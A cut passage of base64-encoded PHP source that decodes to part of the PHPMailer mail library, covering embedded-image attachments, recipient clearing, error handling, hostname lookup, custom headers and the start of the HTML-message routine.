1ZSBvbiBzdWNjZXNzZnVsbHkgYWRkaW5nIGFuIGF0dGFjaG1lbnQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZFN0cmluZ0VtYmVkZGVkSW1hZ2UoCiAgICAgICAgJHN0cmluZywKICAgICAgICAkY2lkLAogICAgICAgICRuYW1lID0gJycsCiAgICAgICAgJGVuY29kaW5nID0gJ2Jhc2U2NCcsCiAgICAgICAgJHR5cGUgPSAnJywKICAgICAgICAkZGlzcG9zaXRpb24gPSAnaW5saW5lJwogICAgKSB7CiAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIG5hbWUKICAgICAgICBpZiAoJHR5cGUgPT0gJycgYW5kICFlbXB0eSgkbmFtZSkpIHsKICAgICAgICAgICAgJHR5cGUgPSBzZWxmOjpmaWxlbmFtZVRvVHlwZSgkbmFtZSk7CiAgICAgICAgfQoKICAgICAgICAvLyBBcHBlbmQgdG8gJGF0dGFjaG1lbnQgYXJyYXkKICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gYXJyYXkoCiAgICAgICAgICAgIDAgPT4gJHN0cmluZywKICAgICAgICAgICAgMSA9PiAkbmFtZSwKICAgICAgICAgICAgMiA9PiAkbmFtZSwKICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsCiAgICAgICAgICAgIDQgPT4gJHR5cGUsCiAgICAgICAgICAgIDUgPT4gdHJ1ZSwgLy8gaXNTdHJpbmdBdHRhY2htZW50CiAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICA3ID0+ICRjaWQKICAgICAgICApOwogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogQ2hlY2sgaWYgYW4gaW5saW5lIGF0dGFjaG1lbnQgaXMgcHJlc2VudC4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlubGluZUltYWdlRXhpc3RzKCkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+YXR0YWNobWVudCBhcyAkYXR0YWNobWVudCkgewogICAgICAgICAgICBpZiAoJGF0dGFjaG1lbnRbNl0gPT0gJ2lubGluZScpIHsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIGlmIGFuIGF0dGFjaG1lbnQgKG5vbi1pbmxpbmUpIGlzIHByZXNlbnQuCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGF0dGFjaG1lbnRFeGlzdHMoKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7CiAgICAgICAgICAgIGlmICgkYXR0YWNobWVudFs2XSA9PSAnYXR0YWNobWVudCcpIHsKICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIGlmIHRoaXMgbWVzc2FnZSBoYXMgYW4gYWx0ZXJuYXRpdmUgYm9keSBzZXQuCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFsdGVybmF0aXZlRXhpc3RzKCkKICAgIHsKICAgICAgICByZXR1cm4gIWVtcHR5KCR0aGlzLT5BbHRCb2R5KTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIHF1ZXVlZCBhZGRyZXNzZXMgb2YgZ2l2ZW4ga2luZC4KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcGFyYW0gc3RyaW5nICRraW5kICd0bycsICdjYycsIG9yICdiY2MnCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyUXVldWVkQWRkcmVzc2VzKCRraW5kKQogICAgewogICAgICAgICRSZWNpcGllbnRzUXVldWUgPSAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlOwogICAgICAgIGZvcmVhY2ggKCRSZWNpcGllbnRzUXVldWUgYXMgJGFkZHJlc3MgPT4gJHBhcmFtcykgewogICAgICAgICAgICBpZiAoJHBhcmFtc1swXSA9PSAka2luZCkgewogICAgICAgICAgICAgICAgdW5zZXQoJHRoaXMtPlJlY2lwaWVudHNRdWV1ZVskYWRkcmVzc10pOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogQ2xlYXIgYWxsIFRvIHJlY2lwaWVudHMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQWRkcmVzc2VzKCkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+dG8gYXMgJHRvKSB7CiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCR0b1swXSldKTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPnRvID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+Y2xlYXJRdWV1ZWRBZGRyZXNzZXMoJ3RvJyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgQ0MgcmVjaXBpZW50cy4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJDQ3MoKQogICAgewogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5jYyBhcyAkY2MpIHsKICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGNjWzBdKV0pOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+Y2MgPSBhcnJheSgpOwogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygnY2MnKTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGFsbCBCQ0MgcmVjaXBpZW50cy4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJCQ0NzKCkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+YmNjIGFzICRiY2MpIHsKICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGJjY1swXSldKTsKICAgICAgICB9CiAgICAgICAgJHRoaXMtPmJjYyA9IGFycmF5KCk7CiAgICAgICAgJHRoaXMtPmNsZWFyUXVldWVkQWRkcmVzc2VzKCdiY2MnKTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGFsbCBSZXBseVRvIHJlY2lwaWVudHMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyUmVwbHlUb3MoKQogICAgewogICAgICAgICR0aGlzLT5SZXBseVRvID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+UmVwbHlUb1F1ZXVlID0gYXJyYXkoKTsKICAgIH0KCiAgICAvKioKICAgICAqIENsZWFyIGFsbCByZWNpcGllbnQgdHlwZXMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQWxsUmVjaXBpZW50cygpCiAgICB7CiAgICAgICAgJHRoaXMtPnRvID0gYXJyYXkoKTsKICAgICAgICAkdGhpcy0+Y2MgPSBhcnJheSgpOwogICAgICAgICR0aGlzLT5iY2MgPSBhcnJheSgpOwogICAgICAgICR0aGlzLT5hbGxfcmVjaXBpZW50cyA9IGFycmF5KCk7CiAgICAgICAgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSA9IGFycmF5KCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgZmlsZXN5c3RlbSwgc3RyaW5nLCBhbmQgYmluYXJ5IGF0dGFjaG1lbnRzLgogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckF0dGFjaG1lbnRzKCkKICAgIHsKICAgICAgICAkdGhpcy0+YXR0YWNobWVudCA9IGFycmF5KCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDbGVhciBhbGwgY3VzdG9tIGhlYWRlcnMuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQ3VzdG9tSGVhZGVycygpCiAgICB7CiAgICAgICAgJHRoaXMtPkN1c3RvbUhlYWRlciA9IGFycmF5KCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gZXJyb3IgbWVzc2FnZSB0byB0aGUgZXJyb3IgY29udGFpbmVyLgogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQKICAgICAqIEBwYXJhbSBzdHJpbmcgJG1zZwogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXRFcnJvcigkbXNnKQogICAgewogICAgICAgICR0aGlzLT5lcnJvcl9jb3VudCsrOwogICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09ICdzbXRwJyBhbmQgIWlzX251bGwoJHRoaXMtPnNtdHApKSB7CiAgICAgICAgICAgICRsYXN0ZXJyb3IgPSAkdGhpcy0+c210cC0+Z2V0RXJyb3IoKTsKICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydlcnJvciddKSkgewogICAgICAgICAgICAgICAgJG1zZyAuPSAkdGhpcy0+bGFuZygnc210cF9lcnJvcicpIC4gJGxhc3RlcnJvclsnZXJyb3InXTsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnZGV0YWlsJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgJG1zZyAuPSAnIERldGFpbDogJy4gJGxhc3RlcnJvclsnZGV0YWlsJ107CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ3NtdHBfY29kZSddKSkgewogICAgICAgICAgICAgICAgICAgICRtc2cgLj0gJyBTTVRQIGNvZGU6ICcgLiAkbGFzdGVycm9yWydzbXRwX2NvZGUnXTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGxhc3RlcnJvclsnc210cF9jb2RlX2V4J10pKSB7CiAgICAgICAgICAgICAgICAgICAgJG1zZyAuPSAnIEFkZGl0aW9uYWwgU01UUCBpbmZvOiAnIC4gJGxhc3RlcnJvclsnc210cF9jb2RlX2V4J107CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHRoaXMtPkVycm9ySW5mbyA9ICRtc2c7CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm4gYW4gUkZDIDgyMiBmb3JtYXR0ZWQgZGF0ZS4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICogQHN0YXRpYwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHJmY0RhdGUoKQogICAgewogICAgICAgIC8vIFNldCB0aGUgdGltZSB6b25lIHRvIHdoYXRldmVyIHRoZSBkZWZhdWx0IGlzIHRvIGF2b2lkIDUwMCBlcnJvcnMKICAgICAgICAvLyBXaWxsIGRlZmF1bHQgdG8gVVRDIGlmIGl0J3Mgbm90IHNldCBwcm9wZXJseSBpbiBwaHAuaW5pCiAgICAgICAgZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldChAZGF0ZV9kZWZhdWx0X3RpbWV6b25lX2dldCgpKTsKICAgICAgICByZXR1cm4gZGF0ZSgnRCwgaiBNIFkgSDppOnMgTycpOwogICAgfQoKICAgIC8qKgogICAgICogR2V0IHRoZSBzZXJ2ZXIgaG9zdG5hbWUuCiAgICAgKiBSZXR1cm5zICdsb2NhbGhvc3QubG9jYWxkb21haW4nIGlmIHVua25vd24uCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlcnZlckhvc3RuYW1lKCkKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJ2xvY2FsaG9zdC5sb2NhbGRvbWFpbic7CiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+SG9zdG5hbWUpKSB7CiAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+SG9zdG5hbWU7CiAgICAgICAgfSBlbHNlaWYgKGlzc2V0KCRfU0VSVkVSKSBhbmQgYXJyYXlfa2V5X2V4aXN0cygnU0VSVkVSX05BTUUnLCAkX1NFUlZFUikgYW5kICFlbXB0eSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkpIHsKICAgICAgICAgICAgJHJlc3VsdCA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOwogICAgICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2dldGhvc3RuYW1lJykgJiYgZ2V0aG9zdG5hbWUoKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgJHJlc3VsdCA9IGdldGhvc3RuYW1lKCk7CiAgICAgICAgfSBlbHNlaWYgKHBocF91bmFtZSgnbicpICE9PSBmYWxzZSkgewogICAgICAgICAgICAkcmVzdWx0ID0gcGhwX3VuYW1lKCduJyk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQoKICAgIC8qKgogICAgICogR2V0IGFuIGVycm9yIG1lc3NhZ2UgaW4gdGhlIGN1cnJlbnQgbGFuZ3VhZ2UuCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHBhcmFtIHN0cmluZyAka2V5CiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gbGFuZygka2V5KQogICAgewogICAgICAgIGlmIChjb3VudCgkdGhpcy0+bGFuZ3VhZ2UpIDwgMSkgewogICAgICAgICAgICAkdGhpcy0+c2V0TGFuZ3VhZ2UoJ2VuJyk7IC8vIHNldCB0aGUgZGVmYXVsdCBsYW5ndWFnZQogICAgICAgIH0KCiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoJGtleSwgJHRoaXMtPmxhbmd1YWdlKSkgewogICAgICAgICAgICBpZiAoJGtleSA9PSAnc210cF9jb25uZWN0X2ZhaWxlZCcpIHsKICAgICAgICAgICAgICAgIC8vSW5jbHVkZSBhIGxpbmsgdG8gdHJvdWJsZXNob290aW5nIGRvY3Mgb24gU01UUCBjb25uZWN0aW9uIGZhaWx1cmUKICAgICAgICAgICAgICAgIC8vdGhpcyBpcyBieSBmYXIgdGhlIGJpZ2dlc3QgY2F1c2Ugb2Ygc3VwcG9ydCBxdWVzdGlvbnMKICAgICAgICAgICAgICAgIC8vYnV0IGl0J3MgdXN1YWxseSBub3QgUEhQTWFpbGVyJ3MgZmF1bHQuCiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPmxhbmd1YWdlWyRrZXldIC4gJyBodHRwczovL2dpdGh1Yi5jb20vUEhQTWFpbGVyL1BIUE1haWxlci93aWtpL1Ryb3VibGVzaG9vdGluZyc7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZVska2V5XTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvL1JldHVybiB0aGUga2V5IGFzIGEgZmFsbGJhY2sKICAgICAgICAgICAgcmV0dXJuICRrZXk7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogQ2hlY2sgaWYgYW4gZXJyb3Igb2NjdXJyZWQuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBib29sZWFuIFRydWUgaWYgYW4gZXJyb3IgZGlkIG9jY3VyLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNFcnJvcigpCiAgICB7CiAgICAgICAgcmV0dXJuICgkdGhpcy0+ZXJyb3JfY291bnQgPiAwKTsKICAgIH0KCiAgICAvKioKICAgICAqIEVuc3VyZSBjb25zaXN0ZW50IGxpbmUgZW5kaW5ncyBpbiBhIHN0cmluZy4KICAgICAqIENoYW5nZXMgZXZlcnkgZW5kIG9mIGxpbmUgZnJvbSBDUkxGLCBDUiBvciBMRiB0byAkdGhpcy0+TEUuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyIFN0cmluZyB0byBmaXhFT0wKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBmaXhFT0woJHN0cikKICAgIHsKICAgICAgICAvLyBOb3JtYWxpc2UgdG8gXG4KICAgICAgICAkbnN0ciA9IHN0cl9yZXBsYWNlKGFycmF5KCJcclxuIiwgIlxyIiksICJcbiIsICRzdHIpOwogICAgICAgIC8vIE5vdyBjb252ZXJ0IExFIGFzIG5lZWRlZAogICAgICAgIGlmICgkdGhpcy0+TEUgIT09ICJcbiIpIHsKICAgICAgICAgICAgJG5zdHIgPSBzdHJfcmVwbGFjZSgiXG4iLCAkdGhpcy0+TEUsICRuc3RyKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRuc3RyOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgY3VzdG9tIGhlYWRlci4KICAgICAqICRuYW1lIHZhbHVlIGNhbiBiZSBvdmVybG9hZGVkIHRvIGNvbnRhaW4KICAgICAqIGJvdGggaGVhZGVyIG5hbWUgYW5kIHZhbHVlIChuYW1lOnZhbHVlKQogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgQ3VzdG9tIGhlYWRlciBuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nICR2YWx1ZSBIZWFkZXIgdmFsdWUKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQ3VzdG9tSGVhZGVyKCRuYW1lLCAkdmFsdWUgPSBudWxsKQogICAgewogICAgICAgIGlmICgkdmFsdWUgPT09IG51bGwpIHsKICAgICAgICAgICAgLy8gVmFsdWUgcGFzc2VkIGluIGFzIG5hbWU6dmFsdWUKICAgICAgICAgICAgJHRoaXMtPkN1c3RvbUhlYWRlcltdID0gZXhwbG9kZSgnOicsICRuYW1lLCAyKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyW10gPSBhcnJheSgkbmFtZSwgJHZhbHVlKTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBSZXR1cm5zIGFsbCBjdXN0b20gaGVhZGVycy4KICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldEN1c3RvbUhlYWRlcnMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+Q3VzdG9tSGVhZGVyOwogICAgfQoKICAgIC8qKgogICAgICogQ3JlYXRlIGEgbWVzc2FnZSBib2R5IGZyb20gYW4gSFRNTCBzdHJpbmcuCiAgICAgKiBBdXRvbWF0aWNhbGx5IGlubGluZXMgaW1hZ2VzIGFuZCBjcmVhdGVzIGEgcGxhaW4tdGV4dCB2ZXJzaW9uIGJ5IGNvbnZlcnRpbmcgdGhlIEhUTUwsCiAgICAgKiBvdmVyd3JpdGluZyBhbnkgZXhpc3RpbmcgdmFsdWVzIGluIEJvZHkgYW5kIEFsdEJvZHkuCiAgICAgKiBEbyBub3Qgc291cmNlICRtZXNzYWdlIGNvbnRlbnQgZnJvbSB1c2VyIGlucHV0IQogICAgICogJGJhc2VkaXIgaXMgcHJlcGVuZGVkIHdoZW4gaGFuZGxpbmcgcmVsYXRpdmUgVVJMcywgZS5nLiA8aW1nIHNyYz0iL2ltYWdlcy9hLnBuZyI+IGFuZCBtdXN0IG5vdCBiZSBlbXB0eQogICAgICogd2lsbCBsb29rIGZvciBhbiBpbWFnZSBmaWxlIGluICRiYXNlZGlyL2ltYWdlcy9hLnBuZyBhbmQgY29udmVydCBpdCB0byBpbmxpbmUuCiAgICAgKiBJZiB5b3UgZG9uJ3QgcHJvdmlkZSBhICRiYXNlZGlyLCByZWxhdGl2ZSBwYXRocyB3aWxsIGJlIGxlZnQgdW50b3VjaGVkIChhbmQgdGh1cyBwcm9iYWJseSBicmVhayBpbiBlbWFpbCkKICAgICAqIElmIHlvdSBkb24ndCB3YW50IHRvIGFwcGx5IHRoZXNlIHRyYW5zZm9ybWF0aW9ucyB0byB5b3VyIEhUTUwsIGp1c3Qgc2V0IEJvZHkgYW5kIEFsdEJvZHkgZGlyZWN0bHkuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkbWVzc2FnZSBIVE1MIG1lc3NhZ2Ugc3RyaW5nCiAgICAgKiBAcGFyYW0gc3RyaW5nICRiYXNlZGlyIEFic29sdXRlIHBhdGggdG8gYSBiYXNlIGRpcmVjdG9yeSB0byBwcmVwZW5kIHRvIHJlbGF0aXZlIHBhdGhzIHRvIGltYWdlcwogICAgICogQHBhcmFtIGJvb2xlYW58Y2FsbGFibGUgJGFkdmFuY2VkIFdoZXRoZXIgdG8gdXNlIHRoZSBpbnRlcm5hbCBIVE1MIHRvIHRleHQgY29udmVydGVyCiAgICAgKiAgICBvciB5b3VyIG93biBjdXN0b20gY29udmVydGVyIEBzZWUgUEhQTWFpbGVyOjpodG1sMnRleHQoKQogICAgICogQHJldHVybiBzdHJpbmcgJG1lc3NhZ2UgVGhlIHRyYW5zZm9ybWVkIG1lc3NhZ2UgQm9keQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gbXNnSFRNTCgkbWVzc2FnZSwgJGJhc2VkaXIgPSAnJywgJGFkdmFuY2VkID0gZmFsc2UpCiAgICB7CiAgICAgICAgcHJlZ19tYXRjaF9hbGwoJy8oc3JjfGJhY2tncm91bmQpPVsiXCddKC4qKVsiXCddL1VpJywgJG1lc3NhZ2UsICRpbWFnZXMpOwogICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDIsICRpbWFnZXMpKSB7CiAgICAgICAgICAgIGlmIChzdHJsZW4oJGJhc2VkaXIpID4gMSAmJiBzdWJzdHIoJGJhc2VkaXIsIC0xKSAhPSAnLycpIHsKICAgICAgICAgICAgICAgIC8vIEVuc3VyZSAkYmFzZWRpciBoYXMgYSB0cmFpbGluZyAvCiAgICAgICAgICAgICAgICAkYmFzZWRpciAuPSAnLyc7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZm9yZWFjaCAoJGltYWdlc1syXSBhcyAkaW1naW5kZXggPT4gJHVybCkgewogICAgICAgICAgICAgICAgLy8gQ29udmVydCBkYXRhIFVSSXMgaW50byBlbWJlZGRlZCBpbWFnZXMKICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcjXmRhdGE6KGltYWdlW147LF0qKSg7YmFzZTY0KT8sIycsICR1cmwsICRtYXRjaCkpIHsKICAgICAgICAgICAgICAgICAgICAkZGF0YSA9IHN1YnN0cigkdXJsLCBzdHJwb3MoJHVybCwgJywnKSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRtYXRjaFsyXSkgewogICAgICAgICAgICAgICAgICAgICAgICAkZGF0YSA9IGJhc2U2NF9kZWNvZGUoJGRhdGEpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRkYXRhID0gcmF3dXJsZGVjb2RlKCRkYXRhKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJGNpZCA9IG1kNSgkdXJsKSAuICdAcGhwbWFpbGVyLjAnOyAvLyBSRkMyMzkyIFMgMgogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+YWRkU3RyaW5nRW1iZWRkZWRJbWFnZSgkZGF0YSwgJGNpZCwgJ2VtYmVkJyAuICRpbWdpbmRleCwgJ2Jhc2U2NCcsICRtYXRjaFsxXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSBzdHJfcmVwbGFjZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbWFnZXNbMF1bJGltZ2luZGV4XSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbWFnZXNbMV1bJGltZ2luZGV4XSAuICc9ImNpZDonIC4gJGNpZCAuICciJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlCiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKAogICAgICAgICAgICAgICAgICAgIC8vIE9ubHkgcHJvY2VzcyByZWxhdGl2ZSBVUkxzIGlmIGEgYmFzZWRpciBpcyBwcm92aWRlZCAoaS5lLiBubyBhYnNvbHV0ZSBsb2NhbCBwYXRocykKICAgICAgICAgICAgICAgICAgICAhZW1wdHkoJGJhc2VkaXIpCiAgICAgICAgICAgICAgICAgICAgLy8gSWdub3JlIFVSTHMgY29udGFpbmluZyBwYXJlbnQgZGlyIHRyYXZlcnNhbCAoLi4pCiAgICAgICAgICAgICAgICAgICAgJiYgKHN0cnBvcygkdXJsLCAnLi4nKSA9PT0gZmFsc2UpCiAgICAgICAgICAgICAgICAgICAgLy8gRG8gbm90IGNoYW5nZSB1cmxzIHRoYXQgYXJlIGFscmVhZHkgaW5saW5lIGltYWdlcwogICAgICAgICAgICAgICAgICAgICYmIHN1YnN0cigkdXJsLCAwLCA0KSAhPT0gJ2NpZDonCiAgICAgICAgICAgICAgICAgICAgLy8gRG8gbm90IGNoYW5nZSBhYnNvbHV0ZSBVUkxzLCBpbmNsdWRpbmcgYW5vbnltb3VzIHByb3RvY29sCiAgICAgICAgICAgICAgICAgICAgJiYgIXByZWdfbWF0Y2goJyNeW2Etel1bYS16MC05Ky4tXSo6Py8vI2knLCAkdXJsKQogICAgICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICAgICAgICAgJGZpbGVuYW1lID0gYmFzZW5hbWUoJHVybCk7CiAgICAgICAgICAgICAgICAgICAgJGRpcmVjdG9yeSA9IGRpcm5hbWUoJHVybCk7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRkaXJlY3RvcnkgPT0gJy4nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRkaXJlY3RvcnkgPSAnJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJGNpZCA9IG1kNSgkdXJsKSAuICdAcGhwbWFpbGVyLjAnOyAvLyBSRkMyMzkyIFMgMgogICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJGRpcmVjdG9yeSkgPiAxICYmIHN1YnN0cigkZGlyZWN0b3J5LCAtMSkgIT0gJy8nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRkaXJlY3RvcnkgLj0gJy8nOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmFkZEVtYmVkZGVkSW1hZ2UoCiAgICAgICAgICAgICAgICAgICAgICAgICRiYXNlZGlyIC4gJGRpcmVjdG9yeSAuICRmaWxlbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgJGNpZCwKICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGVuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAnYmFzZTY0JywKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZjo6X21pbWVfdHlwZXMoKHN0cmluZylzZWxmOjptYl9wYXRoaW5mbygkZmlsZW5hbWUsIFBBVEhJTkZPX0VYVEVOU0lPTikpCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICkgewogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9IHByZWdfcmVwbGFjZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICcvJyAuICRpbWFnZXNbMV1bJGltZ2luZGV4XSAuICc9WyJcJ10nIC4gcHJlZ19xdW90ZSgkdXJsLCAnLycpIC4gJ1siXCddL1VpJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbWFnZXNbMV1bJGltZ2luZGV4XSAuICc9ImNpZDonIC4gJGNpZCAuICciJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlCiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICR0aGlzLT5pc0hUTUwodHJ1ZSk7CiAgICAgICAgLy8gQ29udmVydCBhbGwgbWVzc2FnZSBib2R5IGxpbmUgYnJlYWtzIHRvIENSTEYsIG1ha2VzIHF1b3RlZC1wcmludGFibGUgZW5jb2Rpbmcgd29yayBtdWNoIGJldHRlcgogICAgICAgICR0aGlzLT5Cb2R5ID0gJHRoaXMt